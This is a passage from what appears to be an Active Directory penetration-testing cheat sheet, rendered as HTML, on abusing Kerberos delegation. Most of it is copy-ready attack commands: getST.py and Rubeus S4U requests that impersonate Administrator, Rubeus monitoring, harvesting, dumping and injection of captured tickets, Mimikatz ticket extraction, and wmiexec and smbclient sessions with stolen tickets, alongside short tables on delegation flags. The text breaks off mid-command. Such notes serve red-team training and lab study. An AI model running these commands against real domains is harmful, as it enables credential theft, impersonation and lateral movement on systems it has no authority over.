+<div class="language-bash highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span>cifs/<span class="nv">$TARGET</span><span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>With AES:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span>cifs/<span class="nv">$TARGET</span><span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span><span class="w"> </span>-aesKey<span class="w"> </span><span class="nv">$AES256</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>Use output ccache:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>klist
+</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a>smbclient.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>Rubeus S4U with account key:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">svc_web</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">8846f7eaee8fb117ad06bdd830b7586c</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">filesrv01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Rubeus S4U with AES:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">svc_web</span> <span class="p">/</span><span class="n">aes256</span><span class="p">:</span><span class="n">USER_AES256_KEY</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">filesrv01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Use an existing TGT:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">svc_web</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">filesrv01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Alternative service name:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">svc_web</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">USER_NT_HASH</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">ldap</span><span class="p">/</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">altservice</span><span class="p">:</span><span class="n">cifs</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<hr />
+<h2 id="kerberos-delegation">Kerberos Delegation</h2>
+<p>Kerberos delegation allows a service to access another service on behalf of a user.</p>
+<p>Delegation is common in multi-tier applications.</p>
+<p>Examples:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>User -&gt; Web App -&gt; SQL Server
+</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a>User -&gt; Frontend -&gt; Backend API
+</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3" href="#__codelineno-80-3"></a>User -&gt; IIS App -&gt; File Share
+</span></code></pre></div>
+<p>Delegation types:</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Main idea</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Unconstrained delegation</td>
+<td>Service can receive forwarded TGTs.</td>
+</tr>
+<tr>
+<td>Constrained delegation</td>
+<td>Service can delegate only to configured SPNs.</td>
+</tr>
+<tr>
+<td>Resource-Based Constrained Delegation</td>
+<td>Target resource decides who can act on its behalf.</td>
+</tr>
+</tbody>
+</table>
+<p>Important attributes and flags:</p>
+<table>
+<thead>
+<tr>
+<th>Attribute / flag</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>TRUSTED_FOR_DELEGATION</code></td>
+<td>Unconstrained delegation.</td>
+</tr>
+<tr>
+<td><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code></td>
+<td>Protocol transition for constrained delegation.</td>
+</tr>
+<tr>
+<td><code>msDS-AllowedToDelegateTo</code></td>
+<td>Allowed target SPNs.</td>
+</tr>
+<tr>
+<td><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></td>
+<td>RBCD target-side security descriptor.</td>
+</tr>
+<tr>
+<td><code>AccountNotDelegated</code></td>
+<td>User is sensitive and cannot be delegated.</td>
+</tr>
+<tr>
+<td>Protected Users group</td>
+<td>Delegation may fail for members.</td>
+</tr>
+</tbody>
+</table>
+<p>NetExec delegation discovery:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--find-delegation
+</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--trusted-for-delegation
+</span></code></pre></div>
+<p>LDAP unconstrained delegation:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(userAccountControl:1.2.840.113556.1.4.803:=524288)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a>sAMAccountName<span class="w"> </span>dNSHostName<span class="w"> </span>servicePrincipalName<span class="w"> </span>userAccountControl
+</span></code></pre></div>
+<p>LDAP constrained delegation:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(msDS-AllowedToDelegateTo=*)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3" href="#__codelineno-83-3"></a>sAMAccountName<span class="w"> </span>dNSHostName<span class="w"> </span>servicePrincipalName<span class="w"> </span>msDS-AllowedToDelegateTo<span class="w"> </span>userAccountControl
+</span></code></pre></div>
+<p>LDAP RBCD:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(msDS-AllowedToActOnBehalfOfOtherIdentity=*)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3" href="#__codelineno-84-3"></a>sAMAccountName<span class="w"> </span>dNSHostName<span class="w"> </span>msDS-AllowedToActOnBehalfOfOtherIdentity
+</span></code></pre></div>
+<p>PowerView:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="nb">Get-DomainComputer</span> <span class="n">-Unconstrained</span>
+</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a><span class="nb">Get-DomainUser</span> <span class="n">-Unconstrained</span>
+</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#__codelineno-85-3"></a><span class="nb">Get-DomainComputer</span> <span class="n">-TrustedToAuth</span>
+</span><span id="__span-85-4"><a id="__codelineno-85-4" name="__codelineno-85-4" href="#__codelineno-85-4"></a><span class="nb">Get-DomainUser</span> <span class="n">-TrustedToAuth</span>
+</span><span id="__span-85-5"><a id="__codelineno-85-5" name="__codelineno-85-5" href="#__codelineno-85-5"></a><span class="nb">Get-DomainObject</span> <span class="n">-LDAPFilter</span> <span class="s2">&quot;(msDS-AllowedToActOnBehalfOfOtherIdentity=*)&quot;</span>
+</span></code></pre></div>
+<p>Delegation result interpretation:</p>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>User with unconstrained delegation</td>
+<td>High-value if controlled or reachable.</td>
+</tr>
+<tr>
+<td>Computer with unconstrained delegation</td>
+<td>High-value host.</td>
+</tr>
+<tr>
+<td><code>msDS-AllowedToDelegateTo</code> set</td>
+<td>Constrained delegation candidate.</td>
+</tr>
+<tr>
+<td><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code></td>
+<td>Protocol transition possible.</td>
+</tr>
+<tr>
+<td>RBCD attribute set</td>
+<td>Target allows specific principal to act on behalf of users.</td>
+</tr>
+<tr>
+<td>Sensitive user</td>
+<td>Delegation may not work against that user.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="unconstrained-delegation">Unconstrained Delegation</h2>
+<p>Unconstrained delegation allows a service to receive forwarded TGTs from users authenticating to it.</p>
+<p>If a host or service account with unconstrained delegation is compromised, tickets from users connecting to that service may be captured and reused.</p>
+<p>Requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Unconstrained delegation target</td>
+<td>User or computer with delegation flag.</td>
+</tr>
+<tr>
+<td>Control over target</td>
+<td>Local admin or account control.</td>
+</tr>
+<tr>
+<td>User authentication to target</td>
+<td>A user must connect and present delegated ticket.</td>
+</tr>
+<tr>
+<td>Ticket extraction tool</td>
+<td>Rubeus, Mimikatz, or similar in lab.</td>
+</tr>
+</tbody>
+</table>
+<p>Find unconstrained delegation:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--trusted-for-delegation
+</span></code></pre></div>
+<p>LDAP:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(userAccountControl:1.2.840.113556.1.4.803:=524288)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3" href="#__codelineno-87-3"></a>sAMAccountName<span class="w"> </span>dNSHostName<span class="w"> </span>servicePrincipalName<span class="w"> </span>userAccountControl
+</span></code></pre></div>
+<p>PowerView:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a><span class="nb">Get-DomainComputer</span> <span class="n">-Unconstrained</span>
+</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a><span class="nb">Get-DomainUser</span> <span class="n">-Unconstrained</span>
+</span></code></pre></div>
+<p>On controlled host, monitor tickets with Rubeus:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">monitor</span> <span class="p">/</span><span class="n">interval</span><span class="p">:</span><span class="n">5</span>
+</span></code></pre></div>
+<p>Monitor and target service:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">monitor</span> <span class="p">/</span><span class="n">interval</span><span class="p">:</span><span class="n">5</span> <span class="p">/</span><span class="n">targetuser</span><span class="p">:</span><span class="n">Administrator</span>
+</span></code></pre></div>
+<p>Harvest tickets:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">harvest</span> <span class="p">/</span><span class="n">interval</span><span class="p">:</span><span class="n">30</span>
+</span></code></pre></div>
+<p>List tickets:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">triage</span>
+</span></code></pre></div>
+<p>Dump tickets:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">dump</span>
+</span></code></pre></div>
+<p>Inject captured ticket:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">captured</span><span class="p">.</span><span class="n">kirbi</span>
+</span></code></pre></div>
+<p>Mimikatz ticket extraction:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>mimikatz.exe
+</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a>privilege::debug
+</span><span id="__span-95-3"><a id="__codelineno-95-3" name="__codelineno-95-3" href="#__codelineno-95-3"></a>sekurlsa::tickets
+</span><span id="__span-95-4"><a id="__codelineno-95-4" name="__codelineno-95-4" href="#__codelineno-95-4"></a>kerberos::list /export
+</span></code></pre></div>
+<p>Use ticket on Linux:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>ticketConverter.py<span class="w"> </span>captured.kirbi<span class="w"> </span>captured.ccache
+</span><span id="__span-96-2"><a id="__codelineno-96-2" name="__codelineno-96-2" href="#__codelineno-96-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/captured.ccache
+</span><span id="__span-96-3"><a id="__codelineno-96-3" name="__codelineno-96-3" href="#__codelineno-96-3"></a>klist
+</span><span id="__span-96-4"><a id="__codelineno-96-4" name="__codelineno-96-4" href="#__codelineno-96-4"></a>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>Coercion can sometimes be used in labs to make a privileged machine authenticate to the unconstrained delegation host, but coercion techniques belong to NTLM relay/coercion notes.</p>
+<hr />
+<h2 id="constrained-delegation">Constrained Delegation</h2>
+<p>Constrained delegation restricts which services an account can delegate to.</p>
+<p>The allowed services are stored in <code>msDS-AllowedToDelegateTo</code>.</p>
+<p>If the account is controlled and protocol transition is allowed, S4U can be used to impersonate another user to the allowed service.</p>
+<p>Requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Controlled delegated account</td>
+<td>User or computer account.</td>
+</tr>
+<tr>
+<td><code>msDS-AllowedToDelegateTo</code></td>
+<td>Target SPNs.</td>
+</tr>
+<tr>
+<td>Account key or TGT</td>
+<td>Password, hash, AES key, or ticket.</td>
+</tr>
+<tr>
+<td>Impersonated user</td>
+<td>Target user to impersonate.</td>
+</tr>
+<tr>
+<td>Target SPN</td>
+<td>Must match allowed delegation path.</td>
+</tr>
+</tbody>
+</table>
+<p>Find constrained delegation:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--find-delegation
+</span></code></pre></div>
+<p>LDAP:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-98-2"><a id="__codelineno-98-2" name="__codelineno-98-2" href="#__codelineno-98-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(msDS-AllowedToDelegateTo=*)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-98-3"><a id="__codelineno-98-3" name="__codelineno-98-3" href="#__codelineno-98-3"></a>sAMAccountName<span class="w"> </span>dNSHostName<span class="w"> </span>servicePrincipalName<span class="w"> </span>msDS-AllowedToDelegateTo<span class="w"> </span>userAccountControl
+</span></code></pre></div>
+<p>PowerView:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-TrustedToAuth</span>
+</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a><span class="nb">Get-DomainComputer</span> <span class="n">-TrustedToAuth</span>
+</span><span id="__span-99-3"><a id="__codelineno-99-3" name="__codelineno-99-3" href="#__codelineno-99-3"></a><span class="nb">Get-DomainObject</span> <span class="n">-LDAPFilter</span> <span class="s2">&quot;(msDS-AllowedToDelegateTo=*)&quot;</span>
+</span></code></pre></div>
+<p>Impacket with password:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span>cifs/filesrv01.corp.local<span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="nv">$DOMAIN</span>/svc_web:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span>cifs/filesrv01.corp.local<span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="nv">$DOMAIN</span>/svc_web<span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>With AES:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span>cifs/filesrv01.corp.local<span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="nv">$DOMAIN</span>/svc_web<span class="w"> </span>-aesKey<span class="w"> </span><span class="nv">$AES256</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>Use service ticket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span><span id="__span-103-2"><a id="__codelineno-103-2" name="__codelineno-103-2" href="#__codelineno-103-2"></a>klist
+</span><span id="__span-103-3"><a id="__codelineno-103-3" name="__codelineno-103-3" href="#__codelineno-103-3"></a>smbclient.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@filesrv01.corp.local
+</span></code></pre></div>
+<p>Rubeus:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">svc_web</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">USER_NT_HASH</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">filesrv01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>With alternate service:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">svc_web</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">USER_NT_HASH</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">ldap</span><span class="p">/</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">altservice</span><span class="p">:</span><span class="n">cifs</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span 